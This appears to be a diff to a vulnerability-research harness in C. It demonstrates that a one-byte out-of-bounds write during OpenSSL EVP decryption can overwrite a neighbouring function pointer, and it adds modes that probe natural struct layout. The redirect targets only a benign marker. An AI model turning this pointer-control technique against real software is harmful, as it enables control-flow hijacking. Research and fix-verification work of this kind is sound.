@@ -8,13 +8,16 @@
 // A 256-byte-aligned dispatch table makes the redirect observable: table[0]
 // is the normal handler, table[9] (low byte 0x48) is a benign marker.
 //
-// Modes: vuln, fixed, single, nopad, safe.  Compile the same source against
-// the vulnerable and the fixed library; mode selects the decryption shape.
-// This is a synthetic consumer (rung-4 pointer control), not a real app or
-// remote command execution.
+// Modes: vuln, fixed, single, nopad, safe, natural_tag, natural_pad. The last
+// two probe compiler-chosen struct alignment without an aligned dispatch table;
+// they report layout, byte 31 and the handler low byte but do not call through
+// the pointer. Compile the same source against the vulnerable and the fixed
+// library; mode selects the decryption shape. This is a synthetic consumer
+// (rung-4 pointer control), not a real app or remote command execution.
 #include <openssl/evp.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <stddef.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -54,6 +57,20 @@ struct rec32 {
 };
 #pragma pack(pop)
 
+// Natural (compiler-chosen) alignment: no #pragma pack, no aligned table.
+// The leading tag shifts scratch one byte into the record so the OOB index 31
+// lands on the pointer's LSB; without the tag, index 31 lands in the compiler's
+// alignment padding before the 8-aligned handler.
+struct nat_tag {
+  uint8_t tag;
+  uint8_t scratch[31];
+  void (*handler)(void);
+};
+struct nat_pad {
+  uint8_t scratch[31];
+  void (*handler)(void);
+};
+
 static int make_ct(uint8_t *ct, int *ct_len, uint8_t last) {
   uint8_t pt[32];
   for (int i = 0; i < 32; i++) {
@@ -73,6 +90,11 @@ static int make_ct(uint8_t *ct, int *ct_len, uint8_t last) {
   return ok;
 }
 
+static void report_handler(const char *phase, const char *mode, void *h) {
+  fprintf(stderr, "mode=%s handler_%s=%p low=0x%02x\n", mode, phase, h,
+          (unsigned)((uintptr_t)h & 0xff));
+}
+
 static void process(const uint8_t *ct, int ct_len, const char *mode) {
   g_table[0] = normal_handler;
   g_table[9] = marker_handler;
@@ -83,13 +105,21 @@ static void process(const uint8_t *ct, int ct_len, const char *mode) {
   }
 
   uint8_t *out = NULL;
+  void *alloc = NULL;
   void (***slot)(void) = NULL;
+  void (**nslot)(void) = NULL;
   struct rec31 *r31 = NULL;
   struct rec32 *r32 = NULL;
+  struct nat_tag *nt = NULL;
+  struct nat_pad *np = NULL;
+  size_t scratch_off = 0;
+  size_t handler_off = 0;
   int pad = 1;
   int mode_single = (strcmp(mode, "single") == 0);
   int mode_nopad = (strcmp(mode, "nopad") == 0);
   int mode_safe = (strcmp(mode, "safe") == 0);
+  int mode_nat_tag = (strcmp(mode, "natural_tag") == 0);
+  int mode_nat_pad = (strcmp(mode, "natural_pad") == 0);
   if (mode_nopad) {
     pad = 0;
   }
@@ -97,6 +127,7 @@ static void process(const uint8_t *ct, int ct_len, const char *mode) {
   if (mode_single) {
     // Single call into the documented minimum for the whole 48-byte input.
     out = malloc(63);
+    alloc = out;
     if (out != NULL) {
       memset(out, 0xab, 63);
     }
@@ -107,6 +138,30 @@ static void process(const uint8_t *ct, int ct_len, const char *mode) {
       r32->handler = &g_table[0];
       out = r32->scratch;
       slot = &r32->handler;
+      alloc = r32;
+    }
+  } else if (mode_nat_tag) {
+    nt = malloc(sizeof(*nt));
+    if (nt != NULL) {
+      memset(nt, 0xab, sizeof(*nt));
+      nt->tag = 1;
+      nt->handler = normal_handler;
+      out = nt->scratch;
+      nslot = &nt->handler;
+      scratch_off = offsetof(struct nat_tag, scratch);
+      handler_off = offsetof(struct nat_tag, handler);
+      alloc = nt;
+    }
+  } else if (mode_nat_pad) {
+    np = malloc(sizeof(*np));
+    if (np != NULL) {
+      memset(np, 0xab, sizeof(*np));
+      np->handler = normal_handler;
+      out = np->scratch;
+      nslot = &np->handler;
+      scratch_off = offsetof(struct nat_pad, scratch);
+      handler_off = offsetof(struct nat_pad, handler);
+      alloc = np;
     }
   } else {
     r31 = malloc(sizeof(*r31));
@@ -115,6 +170,7 @@ static void process(const uint8_t *ct, int ct_len, const char *mode) {
       r31->handler = &g_table[0];
       out = r31->scratch;
       slot = &r31->handler;
+      alloc = r31;
     }
   }
   if (out == NULL) {
@@ -122,8 +178,9 @@ static void process(const uint8_t *ct, int ct_len, const char *mode) {
     exit(2);
   }
   if (slot != NULL) {
-    fprintf(stderr, "mode=%s handler_before=%p low=0x%02x\n", mode,
-            (void *)*slot, (unsigned)((uintptr_t)*slot & 0xff));
+    report_handler("before", mode, (void *)*slot);
+  } else if (nslot != NULL) {
+    report_handler("before", mode, (void *)*nslot);
   } else {
     fprintf(stderr, "mode=%s single_call_start\n", mode);
   }
@@ -149,16 +206,23 @@ static void process(const uint8_t *ct, int ct_len, const char *mode) {
     fprintf(stderr, "decrypt failed\n");
   }
 
-  if (slot != NULL) {
-    fprintf(stderr, "mode=%s handler_after=%p low=0x%02x\n", mode,
-            (void *)*slot, (unsigned)((uintptr_t)*slot & 0xff));
-    // The control datum: an indirect call through the adjacent pointer.
-    (**slot)();
+  if (slot != NULL || nslot != NULL) {
+    void *h = (slot != NULL) ? (void *)*slot : (void *)*nslot;
+    report_handler("after", mode, h);
+    if (nslot != NULL) {
+      fprintf(stderr,
+              "mode=%s layout scratch_off=%zu handler_off=%zu oob_byte=0x%02x\n",
+              mode, scratch_off, handler_off, out[31]);
+      fprintf(stderr, "mode=%s natural_layout_no_indirect_call\n", mode);
+    } else {
+      // The control datum: an indirect call through the adjacent pointer.
+      (**slot)();
+    }
   } else {
     fprintf(stderr, "mode=%s single_call_no_adjacent_pointer\n", mode);
   }
   EVP_CIPHER_CTX_free(ctx);
-  free(out);
+  free(alloc);
 }
 
 int main(int argc, char **argv) {
